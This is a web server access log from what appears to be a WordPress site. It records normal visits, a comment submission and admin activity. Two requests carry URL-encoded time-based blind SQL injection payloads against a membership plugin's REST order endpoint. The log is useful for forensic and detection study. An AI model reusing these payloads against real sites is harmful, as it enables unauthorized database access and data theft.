240.136.42.209 - - [05/Sep/2023:02:49:58 +0000] "GET / HTTP/1.1" 200 10315 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:49:58 +0000] "GET /index.php/2023/08/30/hello-world/ HTTP/1.1" 200 14024 "http://www.sipress.com/wp-admin/edit-comments.php?p=1&comment_status=approved" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:49:58 +0000] "GET /wp-includes/js/comment-reply.min.js?ver=6.1.1 HTTP/1.1" 200 1701 "http://www.sipress.com/index.php/2023/08/30/hello-world/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:49:48 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%206805%20FROM%20%28SELECT%28SLEEP%285-%28IF%2849%3D49%2C0%2C5%29%29%29%29%29mFrw%29%20AND%20%27KavC%27%3D%27KavC HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:50:03 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%202637%20FROM%20%28SELECT%28SLEEP%285-%28IF%2857%2049%2C0%2C5%29%29%29%29%29fgeN%29%20AND%20%27sNQP%27%3D%27sNQP HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
240.136.42.209 - - [05/Sep/2023:02:50:09 +0000] "POST /wp-comments-post.php HTTP/1.1" 302 403 "http://www.sipress.com/index.php/2023/08/30/hello-world/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:50:09 +0000] "GET /index.php/2023/08/30/hello-world/ HTTP/1.1" 200 14177 "http://www.sipress.com/index.php/2023/08/30/hello-world/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:50:13 +0000] "GET /wp-admin/ HTTP/1.1" 200 13697 "http://www.sipress.com/index.php/2023/08/30/hello-world/?unapproved=2&moderation-hash=b161c55854006cc853dcbb00e7e86edc" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:50:13 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 836 "http://www.sipress.com/wp-admin/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:50:14 +0000] "GET /wp-admin/profile.php HTTP/1.1" 200 10931 "http://www.sipress.com/wp-admin/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:50:16 +0000] "GET /wp-admin/index.php HTTP/1.1" 200 13698 "http://www.sipress.com/wp-admin/profile.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
